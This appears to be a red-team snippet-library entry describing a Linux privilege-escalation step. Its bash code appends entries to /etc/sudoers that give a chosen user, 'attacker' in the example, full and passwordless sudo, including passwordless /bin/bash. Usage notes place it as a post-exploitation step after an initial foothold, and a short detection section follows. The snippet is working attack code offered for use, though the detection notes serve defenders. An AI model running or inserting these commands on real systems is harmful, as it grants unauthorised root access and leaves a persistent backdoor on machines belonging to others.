---
id: 54c33156-7eee-41ea-b497-8984f07e4f2d
name: append-sudoers-entries-for-linux-privilege-escalation
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:19.284372+00:00'
updated_at: '2023-04-10T20:34:29.644234+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - sudoers
  - script
validated: true
---

# append-sudoers-entries-for-linux-privilege-escalation

## Code

```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## Description

This bash script snippet appends entries to /etc/sudoers to grant a user full sudo access and passwordless execution for all commands and specifically /bin/bash. It exploits writable sudoers for privilege escalation on Linux systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username | The target username to grant privileges to (replace in all echo strings) | attacker |

## Usage

Save as a .sh file or run inline in a shell with write access to /etc/sudoers. Execute during post-exploitation after initial foothold to escalate to root. Follow with 'sudo whoami' to verify. Used in red team exercises for simulating misconfiguration exploitation.

## Detection

- Monitor /etc/sudoers for appends via file auditing (auditd rules on writes).
- Check auth logs for unusual sudo usage post-modification.
- Syntax errors in sudoers may lock out admins; detect via failed sudo attempts.
- Process monitoring for echo commands targeting /etc/sudoers.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Writable-etc-sudoers]]
